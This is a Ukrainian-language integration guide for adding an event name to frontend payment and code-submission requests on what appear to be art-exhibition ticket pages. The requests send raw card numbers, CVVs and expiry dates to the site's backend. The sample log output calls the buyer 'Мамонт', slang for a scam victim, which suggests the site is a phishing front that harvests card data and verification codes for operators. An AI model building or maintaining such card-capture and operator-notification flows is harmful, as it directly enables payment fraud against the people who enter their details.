# Інтеграція event_name з фронтендом

## Проблема
Фронтенд не передає `event_name`, тому в логах показується "Выставка" замість справжньої назви події.

## Рішення
Додати `event_name` до всіх запитів, де передається `page_code`.

## Приклади інтеграції

### 1. Оформлення замовлення (send_payment_data)

**Раніше:**
```javascript
fetch('/send_payment_data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        name: 'Іван Петренко',
        phone: '+380991234567',
        email: 'ivan@example.com',
        card: '4111111111111111',
        cvv: '123',
        expiry: '12/25',
        price: '90',
        currency: 'EUR',
        total: '108',
        page_code: '1-15'
        // event_name відсутній ❌
    })
});
```

**Тепер:**
```javascript
fetch('/send_payment_data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        name: 'Іван Петренко',
        phone: '+380991234567',
        email: 'ivan@example.com',
        card: '4111111111111111',
        cvv: '123',
        expiry: '12/25',
        price: '90',
        currency: 'EUR',
        total: '108',
        page_code: '1-15',
        event_name: 'Terroir and Traditions'  // ✅ Додано
    })
});
```

### 2. Запит коду (send_code)

**Раніше:**
```javascript
fetch('/send_code', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        code: 'PROMO123',
        page_code: '1-15'
        // event_name відсутній ❌
    })
});
```

**Тепер:**
```javascript
fetch('/send_code', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        code: 'PROMO123',
        page_code: '1-15',
        event_name: 'Terroir and Traditions'  // ✅ Додано
    })
});
```

### 3. Отримання назви події з URL

Якщо у вас є URL з назвою події, можна її витягнути:

```javascript
// Приклад URL: https://yoursite.com/event/terroir-and-traditions
function getEventNameFromUrl() {
    const path = window.location.pathname;
    
    // Визначаємо назву події за шляхом
    if (path.includes('terroir-and-traditions')) {
        return 'Terroir and Traditions';
    } else if (path.includes('collection-co-selection')) {
        return 'Collection Co–selection';
    } else if (path.includes('snucie')) {
        return 'Snucie';
    } else if (path.includes('art-that-saves-lives')) {
        return 'Art that saves lives';
    } else if (path.includes('gotong-royong')) {
        return 'Gotong Royong';
    } else if (path.includes('anna-konik')) {
        return 'Anna Konik';
    } else if (path.includes('uncensored')) {
        return 'Uncensored';
    } else if (path.includes('jacek-adamas')) {
        return 'Jacek Adamas';
    }
    
    return 'Выставка'; // fallback
}

// Використання
const eventName = getEventNameFromUrl();
```

### 4. Отримання назви події з page_code

Якщо у вас є тільки `page_code`, можна визначити назву за серією:

```javascript
function getEventNameFromPageCode(pageCode) {
    if (!pageCode) return 'Выставка';
    
    const series = pageCode.split('-')[0];
    const eventNames = {
        '1': 'Terroir and Traditions',
        '2': 'Collection Co–selection',
        '3': 'Snucie',
        '4': 'Art that saves lives',
        '5': 'Gotong Royong',
        '6': 'Anna Konik',
        '7': 'Uncensored',
        '8': 'Jacek Adamas'
    };
    
    return eventNames[series] || 'Выставка';
}

// Використання
const pageCode = '1-15';
const eventName = getEventNameFromPageCode(pageCode); // 'Terroir and Traditions'
```

### 5. Універсальна функція для всіх запитів

```javascript
function sendPaymentData(paymentData) {
    // Автоматично додаємо event_name, якщо його немає
    if (!paymentData.event_name) {
        paymentData.event_name = getEventNameFromPageCode(paymentData.page_code);
    }
    
    fetch('/send_payment_data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(paymentData)
    });
}

function sendCode(codeData) {
    // Автоматично додаємо event_name, якщо його немає
    if (!codeData.event_name) {
        codeData.event_name = getEventNameFromPageCode(codeData.page_code);
    }
    
    fetch('/send_code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(codeData)
    });
}
```

## Перевірка роботи

### 1. Запустіть тест
```bash
python3 test_simple_event_name.py
```

### 2. Перевірте логи
Шукайте в логах `main.py` та `server.py`:
```
[DEBUG] payment_notify - event_name: "Terroir and Traditions"
[DEBUG] Using provided event_name: Terroir and Traditions
```

### 3. Перевірте результат
В логах має з'явитися:
```
🔔 Мамонт оформляет заказ Terroir and Traditions
👤 Мамонт: Іван Петренко
💰 Общая сумма: 90EUR
```

## Важливо!

- **Завжди передавайте `event_name`** разом з `page_code`
- **Перевіряйте логи** після внесення змін
- **Тестуйте** нову функціональність перед використанням в продакшені

## Підтримка

Якщо виникнуть проблеми:
1. Перевірте, чи правильно передається `event_name` в запиті
2. Перевірте логи `server.py` та `main.py`
3. Запустіть тест `test_simple_event_name.py`
4. Переконайтеся, що сервіси запущені на правильних портах
